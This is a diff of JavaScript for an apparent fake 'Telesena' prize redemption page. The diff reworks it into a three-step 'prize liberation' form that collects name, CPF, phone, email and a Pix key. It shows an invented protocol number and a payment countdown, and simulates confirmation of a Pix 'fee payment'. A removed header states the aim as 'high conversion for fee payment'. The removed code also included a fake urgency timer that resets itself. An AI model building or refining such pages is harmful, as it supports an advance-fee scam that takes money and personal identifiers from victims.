@@ -1,8 +1,9 @@
-// Redemption Script - Telesena Prize Redemption Page
-// Focused on high conversion for fee payment via Pix
+// Form Redemption Script - Telesena 3-Step Prize Liberation Form
+// Manages step navigation, form validation, and payment processing
 
 // Global variables
-let countdownInterval;
+let currentStep = 1;
+let formData = {};
 let paymentTimerInterval;
 let currentPixKey = '';
 let currentKeyType = 'cpf';
@@ -11,28 +12,71 @@ let currentKeyType = 'cpf';
 document.addEventListener('DOMContentLoaded', function() {
     initializePage();
     setupEventListeners();
-    startCountdown();
     startPaymentTimer();
     populatePrizeData();
 });
 
 // Initialize page components
 function initializePage() {
-    // Set initial state
-    updateConfirmButton();
+    // Set initial step
+    showStep(1);
     
-    // Initialize FAQ toggles
-    initializeFAQ();
+    // Initialize form data
+    formData = {
+        prizeAmount: 'R$ 2.500,00',
+        protocol: 'TSN-2025-001234',
+        fullName: '',
+        cpf: '',
+        phone: '',
+        email: '',
+        pixKeyType: 'cpf',
+        pixKey: '',
+        termsAccepted: false
+    };
     
     // Set default key type
     updateKeyType('cpf');
     
-    // Add loading states
-    addLoadingStates();
+    // Update button states
+    updateNavigationButtons();
 }
 
 // Setup all event listeners
 function setupEventListeners() {
+    // Step 1 - Personal data form
+    setupStep1Listeners();
+    
+    // Step 2 - Payment and Pix key
+    setupStep2Listeners();
+    
+    // Step 3 - Confirmation
+    setupStep3Listeners();
+    
+    // Navigation buttons
+    setupNavigationListeners();
+}
+
+// Setup Step 1 event listeners
+function setupStep1Listeners() {
+    const fields = ['full-name', 'cpf', 'phone', 'email'];
+    
+    fields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function() {
+                validateField(fieldId, this.value);
+                updateStep1Button();
+            });
+            
+            field.addEventListener('blur', function() {
+                validateField(fieldId, this.value);
+            });
+        }
+    });
+}
+
+// Setup Step 2 event listeners
+function setupStep2Listeners() {
     // Key type selector
     const keyTypeInputs = document.querySelectorAll('input[name="key-type"]');
     keyTypeInputs.forEach(input => {
@@ -46,30 +90,57 @@ function setupEventListeners() {
     if (pixKeyInput) {
         pixKeyInput.addEventListener('input', function() {
             validatePixKey(this.value);
+            updateStep2Button();
         });
         
         pixKeyInput.addEventListener('blur', function() {
             validatePixKey(this.value);
         });
     }
-    
-    // Confirm payment button
-    const confirmBtn = document.getElementById('confirm-payment-btn');
-    if (confirmBtn) {
-        confirmBtn.addEventListener('click', function() {
-            if (!this.disabled) {
-                processPayment();
-            }
+}
+
+// Setup Step 3 event listeners
+function setupStep3Listeners() {
+    const termsCheckbox = document.getElementById('terms-agreement');
+    if (termsCheckbox) {
+        termsCheckbox.addEventListener('change', function() {
+            formData.termsAccepted = this.checked;
+            updateStep3Button();
         });
     }
+}
+
+// Setup navigation event listeners
+function setupNavigationListeners() {
+    // Next buttons
+    const nextStep1 = document.getElementById('next-step-1');
+    const nextStep2 = document.getElementById('next-step-2');
     
-    // FAQ items
-    const faqQuestions = document.querySelectorAll('.faq-question');
-    faqQuestions.forEach(question => {
-        question.addEventListener('click', function() {
-            toggleFAQ(this.parentElement);
-        });
-    });
+    if (nextStep1) {
+        nextStep1.addEventListener('click', () => goToStep(2));
+    }
+    
+    if (nextStep2) {
+        nextStep2.addEventListener('click', () => goToStep(3));
+    }
+    
+    // Previous buttons
+    const prevStep2 = document.getElementById('prev-step-2');
+    const prevStep3 = document.getElementById('prev-step-3');
+    
+    if (prevStep2) {
+        prevStep2.addEventListener('click', () => goToStep(1));
+    }
+    
+    if (prevStep3) {
+        prevStep3.addEventListener('click', () => goToStep(2));
+    }
+    
+    // Confirm payment button
+    const confirmPayment = document.getElementById('confirm-payment');
+    if (confirmPayment) {
+        confirmPayment.addEventListener('click', processPayment);
+    }
 }
 
 // Populate prize data from URL parameters or localStorage
@@ -78,24 +149,23 @@ function populatePrizeData() {
         // Try to get data from URL parameters first
         const urlParams = new URLSearchParams(window.location.search);
         const prizeValue = urlParams.get('prize') || 'R$ 2.500,00';
-        const userName = urlParams.get('name') || 'João Silva Santos';
+        const userName = urlParams.get('name') || '';
         const protocol = urlParams.get('protocol') || 'TSN-2025-001234';
         
         // Update prize display
-        const prizeValueElement = document.getElementById('prize-value');
-        if (prizeValueElement) {
-            prizeValueElement.textContent = prizeValue.replace('R$ ', '');
-        }
+        const prizeAmountElements = document.querySelectorAll('#prize-amount, .amount');
+        prizeAmountElements.forEach(element => {
+            if (element) {
+                element.textContent = prizeValue.replace('R$ ', '');
+            }
+        });
         
-        const userNameElement = document.getElementById('user-name');
-        if (userNameElement) {
-            userNameElement.textContent = userName;
-        }
-        
-        const protocolElement = document.getElementById('prize-protocol');
-        if (protocolElement) {
-            protocolElement.textContent = protocol;
-        }
+        const protocolElements = document.querySelectorAll('#prize-protocol');
+        protocolElements.forEach(element => {
+            if (element) {
+                element.textContent = protocol;
+            }
+        });
         
         // Set expiry date (30 days from now)
         const expiryDate = new Date();
@@ -105,9 +175,203 @@ function populatePrizeData() {
             expiryElement.textContent = expiryDate.toLocaleDateString('pt-BR');
         }
         
+        // Pre-fill name if provided
+        if (userName) {
+            const nameField = document.getElementById('full-name');
+            if (nameField) {
+                nameField.value = userName;
+                formData.fullName = userName;
+                validateField('full-name', userName);
+            }
+        }
+        
+        // Update form data
+        formData.prizeAmount = prizeValue;
+        formData.protocol = protocol;
+        
     } catch (error) {
         console.log('Using default prize data');
     }
+}
+
+// Show specific step
+function showStep(stepNumber) {
+    // Hide all steps
+    const steps = document.querySelectorAll('.form-step');
+    steps.forEach(step => {
+        step.classList.remove('active');
+    });
+    
+    // Show target step
+    const targetStep = document.getElementById(`step-${stepNumber}`);
+    if (targetStep) {
+        targetStep.classList.add('active');
+    }
+    
+    // Update progress indicator
+    updateProgressIndicator(stepNumber);
+    
+    // Update current step
+    currentStep = stepNumber;
+    
+    // Update navigation buttons
+    updateNavigationButtons();
+    
+    // Scroll to top
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// Update progress indicator
+function updateProgressIndicator(activeStep) {
+    const steps = document.querySelectorAll('.step');
+    
+    steps.forEach((step, index) => {
+        const stepNumber = index + 1;
+        
+        // Remove all classes
+        step.classList.remove('active', 'completed');
+        
+        // Add appropriate class
+        if (stepNumber < activeStep) {
+            step.classList.add('completed');
+        } else if (stepNumber === activeStep) {
+            step.classList.add('active');
+        }
+    });
+}
+
+// Go to specific step
+function goToStep(stepNumber) {
+    if (stepNumber < 1 || stepNumber > 3) return;
+    
+    // Validate current step before proceeding
+    if (stepNumber > currentStep) {
+        if (!validateCurrentStep()) {
+            showNotification('Por favor, complete todos os campos obrigatórios', 'error');
+            return;
+        }
+    }
+    
+    // Save current step data
+    saveCurrentStepData();
+    
+    // Show target step
+    showStep(stepNumber);
+    
+    // Update summary if going to step 3
+    if (stepNumber === 3) {
+        updateSummary();
+    }
+}
+
+// Validate current step
+function validateCurrentStep() {
+    switch (currentStep) {
+        case 1:
+            return validateStep1();
+        case 2:
+            return validateStep2();
+        case 3:
+            return validateStep3();
+        default:
+            return true;
+    }
+}
+
+// Validate Step 1
+function validateStep1() {
+    const fields = ['full-name', 'cpf', 'phone', 'email'];
+    let isValid = true;
+    
+    fields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field && !validateField(fieldId, field.value)) {
+            isValid = false;
+        }
+    });
+    
+    return isValid;
+}
+
+// Validate Step 2
+function validateStep2() {
+    return currentPixKey.length > 0;
+}
+
+// Validate Step 3
+function validateStep3() {
+    return formData.termsAccepted;
+}
+
+// Save current step data
+function saveCurrentStepData() {
+    switch (currentStep) {
+        case 1:
+            formData.fullName = document.getElementById('full-name')?.value || '';
+            formData.cpf = document.getElementById('cpf')?.value || '';
+            formData.phone = document.getElementById('phone')?.value || '';
+            formData.email = document.getElementById('email')?.value || '';
+            break;
+        case 2:
+            formData.pixKeyType = currentKeyType;
+            formData.pixKey = currentPixKey;
+            break;
+        case 3:
+            formData.termsAccepted = document.getElementById('terms-agreement')?.checked || false;
+            break;
+    }
+}
+
+// Validate individual field
+function validateField(fieldId, value) {
+    const validation = document.getElementById(`${fieldId.replace('-', '-')}-validation`);
+    let isValid = false;
+    let message = '';
+    
+    switch (fieldId) {
+        case 'full-name':
+            isValid = value.trim().length >= 3 && /^[a-zA-ZÀ-ÿ\s]+$/.test(value.trim());
+            message = isValid ? '✓ Nome válido' : '✗ Nome deve ter pelo menos 3 caracteres e conter apenas letras';
+            break;
+        case 'cpf':
+            isValid = validateCPF(value);
+            message = isValid ? '✓ CPF válido' : '✗ CPF inválido';
+            break;
+        case 'phone':
+            isValid = validatePhone(value);
+            message = isValid ? '✓ Telefone válido' : '✗ Telefone inválido';
+            break;
+        case 'email':
+            isValid = validateEmail(value);
+            message = isValid ? '✓ E-mail válido' : '✗ E-mail inválido';
+            break;
+    }
+    
+    // Update validation display
+    if (validation) {
+        validation.textContent = value.trim() ? message : '';
+        validation.className = `input-validation ${value.trim() ? (isValid ? 'valid' : 'invalid') : ''}`;
+    }
+    
+    // Store valid data
+    if (isValid) {
+        switch (fieldId) {
+            case 'full-name':
+                formData.fullName = value.trim();
+                break;
+            case 'cpf':
+                formData.cpf = value;
+                break;
+            case 'phone':
+                formData.phone = value;
+                break;
+            case 'email':
+                formData.email = value;
+                break;
+        }
+    }
+    
+    return isValid;
 }
 
 // Update key type and input placeholder
@@ -121,8 +385,7 @@ function updateKeyType(type) {
     // Clear current value and validation
     input.value = '';
     currentPixKey = '';
-    updateConfirmButton();
-    clearValidation();
+    clearPixKeyValidation();
     
     // Update icon and placeholder based on type
     switch (type) {
@@ -147,6 +410,8 @@ function updateKeyType(type) {
             input.maxLength = 100;
             break;
     }
+    
+    updateStep2Button();
 }
 
 // Validate Pix key based on type
@@ -158,8 +423,7 @@ function validatePixKey(value) {
     let message = '';
     
     if (!value.trim()) {
-        clearValidation();
-        updateConfirmButton();
+        clearPixKeyValidation();
         return false;
     }
     
@@ -193,7 +457,6 @@ function validatePixKey(value) {
         currentPixKey = '';
     }
     
-    updateConfirmButton();
     return isValid;
 }
 
@@ -246,8 +509,8 @@ function validateRandomKey(key) {
     return key.length >= 32 && /^[a-zA-Z0-9\-]+$/.test(key);
 }
 
-// Clear validation message
-function clearValidation() {
+// Clear Pix key validation message
+function clearPixKeyValidation() {
     const validation = document.getElementById('key-validation');
     if (validation) {
         validation.textContent = '';
@@ -255,51 +518,78 @@ function clearValidation() {
     }
 }
 
-// Update confirm button state
-function updateConfirmButton() {
-    const confirmBtn = document.getElementById('confirm-payment-btn');
-    if (!confirmBtn) return;
-    
-    const isValid = currentPixKey.length > 0;
-    confirmBtn.disabled = !isValid;
-    
-    if (isValid) {
-        confirmBtn.style.opacity = '1';
-        confirmBtn.style.cursor = 'pointer';
-    } else {
-        confirmBtn.style.opacity = '0.6';
-        confirmBtn.style.cursor = 'not-allowed';
-    }
+// Update navigation buttons
+function updateNavigationButtons() {
+    updateStep1Button();
+    updateStep2Button();
+    updateStep3Button();
 }
 
-// Copy Pix code to clipboard
-function copyPixCode() {
-    const pixCodeInput = document.getElementById('pix-code');
-    if (!pixCodeInput) return;
+// Update Step 1 button
+function updateStep1Button() {
+    const button = document.getElementById('next-step-1');
+    if (!button) return;
     
-    // Select and copy the text
-    pixCodeInput.select();
-    pixCodeInput.setSelectionRange(0, 99999); // For mobile devices
+    const isValid = validateStep1();
+    button.disabled = !isValid;
+}
+
+// Update Step 2 button
+function updateStep2Button() {
+    const button = document.getElementById('next-step-2');
+    if (!button) return;
     
-    try {
-        document.execCommand('copy');
-        showNotification('Código Pix copiado!', 'success');
-    } catch (err) {
-        // Fallback for modern browsers
-        navigator.clipboard.writeText(pixCodeInput.value).then(() => {
-            showNotification('Código Pix copiado!', 'success');
-        }).catch(() => {
-            showNotification('Erro ao copiar código', 'error');
-        });
+    const isValid = validateStep2();
+    button.disabled = !isValid;
+}
+
+// Update Step 3 button
+function updateStep3Button() {
+    const button = document.getElementById('confirm-payment');
+    if (!button) return;
+    
+    const isValid = validateStep3();
+    button.disabled = !isValid;
+}
+
+// Update summary in Step 3
+function updateSummary() {
+    // Update prize summary
+    const summaryPrize = document.getElementById('summary-prize');
+    const summaryProtocol = document.getElementById('summary-protocol');
+    const summaryName = document.getElementById('summary-name');
+    const summaryPixKey = document.getElementById('summary-pix-key');
+    
+    if (summaryPrize) summaryPrize.textContent = formData.prizeAmount;
+    if (summaryProtocol) summaryProtocol.textContent = formData.protocol;
+    if (summaryName) summaryName.textContent = formData.fullName;
+    
+    if (summaryPixKey) {
+        // Mask the Pix key for privacy
+        let maskedKey = formData.pixKey;
+        if (formData.pixKeyType === 'cpf') {
+            maskedKey = maskedKey.replace(/(\d{3})\d{3}(\d{3})/, '$1***$2');
+        } else if (formData.pixKeyType === 'email') {
+            const [user, domain] = maskedKey.split('@');
+            maskedKey = `${user.substring(0, 2)}***@${domain}`;
+        } else if (formData.pixKeyType === 'phone') {
+            maskedKey = maskedKey.replace(/(\d{2})\d{5}(\d{4})/, '$1*****$2');
+        } else {
+            maskedKey = `${maskedKey.substring(0, 8)}***${maskedKey.substring(maskedKey.length - 4)}`;
+        }
+        summaryPixKey.textContent = maskedKey;
     }
 }
 
 // Process payment simulation
 function processPayment() {
-    if (!currentPixKey) {
-        showNotification('Por favor, informe sua chave Pix', 'error');
+    if (!validateStep3()) {
+        showNotification('Por favor, aceite os termos para continuar', 'error');
         return;
     }
+    
+    // Save final data
+    saveCurrentStepData();
     
     // Show loading
     showLoading('Processando pagamento...', 'Aguarde enquanto confirmamos seu pagamento');
@@ -316,33 +606,29 @@ function processPayment() {
             setTimeout(() => {
                 // Hide loading and show success
                 hideLoading();
-                showSuccessSection();
+                showSuccessStep();
                 
                 // Show success notification
-                showNotification('Pagamento confirmado com sucesso!', 'success');
-                
-                // Scroll to success section
-                document.getElementById('success-section').scrollIntoView({
-                    behavior: 'smooth'
-                });
+                showNotification('Prêmio liberado com sucesso!', 'success');
                 
             }, 2000);
         }, 2000);
     }, 3000);
 }
 
-// Show success section
-function showSuccessSection() {
-    // Hide payment section
-    const paymentSection = document.getElementById('payment-section');
-    if (paymentSection) {
-        paymentSection.style.display = 'none';
-    }
+// Show success step
+function showSuccessStep() {
+    // Hide all form steps
+    const steps = document.querySelectorAll('.form-step');
+    steps.forEach(step => {
+        step.classList.remove('active');
+    });
     
-    // Show success section
-    const successSection = document.getElementById('success-section');
-    if (successSection) {
-        successSection.style.display = 'block';
+    // Show success step
+    const successStep = document.getElementById('step-success');
+    if (successStep) {
+        successStep.style.display = 'block';
+        successStep.classList.add('active');
         
         // Populate success data
         const successPrize = document.getElementById('success-prize');
@@ -350,19 +636,18 @@ function showSuccessSection() {
         const successProtocol = document.getElementById('success-protocol');
         
         if (successPrize) {
-            const prizeValue = document.getElementById('prize-value');
-            successPrize.textContent = prizeValue ? `R$ ${prizeValue.textContent}` : 'R$ 2.500,00';
+            successPrize.textContent = formData.prizeAmount;
         }
         
         if (successPixKey) {
             // Mask the Pix key for privacy
-            let maskedKey = currentPixKey;
-            if (currentKeyType === 'cpf') {
+            let maskedKey = formData.pixKey;
+            if (formData.pixKeyType === 'cpf') {
                 maskedKey = maskedKey.replace(/(\d{3})\d{3}(\d{3})/, '$1***$2');
-            } else if (currentKeyType === 'email') {
+            } else if (formData.pixKeyType === 'email') {
                 const [user, domain] = maskedKey.split('@');
                 maskedKey = `${user.substring(0, 2)}***@${domain}`;
-            } else if (currentKeyType === 'phone') {
+            } else if (formData.pixKeyType === 'phone') {
                 maskedKey = maskedKey.replace(/(\d{2})\d{5}(\d{4})/, '$1*****$2');
             } else {
                 maskedKey = `${maskedKey.substring(0, 8)}***${maskedKey.substring(maskedKey.length - 4)}`;
@@ -377,47 +662,18 @@ function showSuccessSection() {
         }
     }
     
-    // Stop timers
-    if (countdownInterval) clearInterval(countdownInterval);
-    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
-}
-
-// Countdown timer for urgency
-function startCountdown() {
-    let hours = 23;
-    let minutes = 59;
-    let seconds = 59;
+    // Update progress to show completion
+    const steps = document.querySelectorAll('.step');
+    steps.forEach(step => {
+        step.classList.add('completed');
+        step.classList.remove('active');
+    });
     
-    countdownInterval = setInterval(() => {
-        seconds--;
-        
-        if (seconds < 0) {
-            seconds = 59;
-            minutes--;
-            
-            if (minutes < 0) {
-                minutes = 59;
-                hours--;
-                
-                if (hours < 0) {
-                    // Reset countdown
-                    hours = 23;
-                    minutes = 59;
-                    seconds = 59;
-                }
-            }
-        }
-        
-        // Update display
-        const hoursElement = document.getElementById('hours');
-        const minutesElement = document.getElementById('minutes');
-        const secondsElement = document.getElementById('seconds');
-        
-        if (hoursElement) hoursElement.textContent = hours.toString().padStart(2, '0');
-        if (minutesElement) minutesElement.textContent = minutes.toString().padStart(2, '0');
-        if (secondsElement) secondsElement.textContent = seconds.toString().padStart(2, '0');
-        
-    }, 1000);
+    // Stop timer
+    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
+    
+    // Scroll to top
+    window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
 // Payment timer (15 minutes)
@@ -443,26 +699,25 @@ function startPaymentTimer() {
     }, 1000);
 }
 
-// FAQ functionality
-function initializeFAQ() {
-    // Close all FAQ items initially
-    const faqItems = document.querySelectorAll('.faq-item');
-    faqItems.forEach(item => {
-        item.classList.remove('active');
-    });
-}
-
-function toggleFAQ(faqItem) {
-    const isActive = faqItem.classList.contains('active');
+// Copy Pix code to clipboard
+function copyPixCode() {
+    const pixCodeInput = document.getElementById('pix-code');
+    if (!pixCodeInput) return;
     
-    // Close all FAQ items
-    document.querySelectorAll('.faq-item').forEach(item => {
-        item.classList.remove('active');
-    });
+    // Select and copy the text
+    pixCodeInput.select();
+    pixCodeInput.setSelectionRange(0, 99999); // For mobile devices
     
-    // Open clicked item if it wasn't active
-    if (!isActive) {
-        faqItem.classList.add('active');
+    try {
+        document.execCommand('copy');
+        showNotification('Código Pix copiado!', 'success');
+    } catch (err) {
+        // Fallback for modern browsers
+        navigator.clipboard.writeText(pixCodeInput.value).then(() => {
+            showNotification('Código Pix copiado!', 'success');
+        }).catch(() => {
+            showNotification('Erro ao copiar código', 'error');
+        });
     }
 }
 
@@ -527,30 +782,12 @@ function showNotification(message, type = 'info') {
     }, 4000);
 }
 
-// Add loading states to interactive elements
-function addLoadingStates() {
-    // Add loading state to copy button
-    const copyButton = document.querySelector('.copy-button');
-    if (copyButton) {
-        copyButton.addEventListener('click', function() {
-            const originalText = this.innerHTML;
-            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Copiando...';
-            this.disabled = true;
-            
-            setTimeout(() => {
-                this.innerHTML = originalText;
-                this.disabled = false;
-            }, 1000);
-        });
-    }
-}
-
 // Input formatting
 document.addEventListener('input', function(e) {
     const target = e.target;
     
     // Format CPF input
-    if (target.id === 'pix-key-input' && currentKeyType === 'cpf') {
+    if (target.id === 'cpf' || (target.id === 'pix-key-input' && currentKeyType === 'cpf')) {
         let value = target.value.replace(/\D/g, '');
         value = value.replace(/(\d{3})(\d)/, '$1.$2');
         value = value.replace(/(\d{3})(\d)/, '$1.$2');
@@ -559,7 +796,7 @@ document.addEventListener('input', function(e) {
     }
     
     // Format phone input
-    if (target.id === 'pix-key-input' && currentKeyType === 'phone') {
+    if (target.id === 'phone' || (target.id === 'pix-key-input' && currentKeyType === 'phone')) {
         let value = target.value.replace(/\D/g, '');
         value = value.replace(/(\d{2})(\d)/, '($1) $2');
         value = value.replace(/(\d{4,5})(\d{4})$/, '$1-$2');
@@ -572,20 +809,30 @@ document.addEventListener('keypress', function(e) {
     if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
         e.preventDefault();
         
-        // If on Pix key input, validate and focus confirm button
-        if (e.target.id === 'pix-key-input') {
-            validatePixKey(e.target.value);
-            const confirmBtn = document.getElementById('confirm-payment-btn');
-            if (confirmBtn && !confirmBtn.disabled) {
-                confirmBtn.focus();
-            }
+        // Handle Enter key based on current step
+        switch (currentStep) {
+            case 1:
+                if (validateStep1()) {
+                    goToStep(2);
+                }
+                break;
+            case 2:
+                if (validateStep2()) {
+                    goToStep(3);
+                }
+                break;
+            case 3:
+                if (validateStep3()) {
+                    processPayment();
+                }
+                break;
         }
     }
 });
 
 // Smooth scrolling for anchor links
 document.addEventListener('click', function(e) {
-    if (e.target.tagName === 'A' && e.target.getAttribute('href').startsWith('#')) {
+    if (e.target.tagName === 'A' && e.target.getAttribute('href')?.startsWith('#')) {
         e.preventDefault();
         const targetId = e.target.getAttribute('href').substring(1);
         const targetElement = document.getElementById(targetId);
@@ -612,7 +859,6 @@ document.addEventListener('visibilitychange', function() {
 
 // Cleanup on page unload
 window.addEventListener('beforeunload', function() {
-    if (countdownInterval) clearInterval(countdownInterval);
     if (paymentTimerInterval) clearInterval(paymentTimerInterval);
 });
 
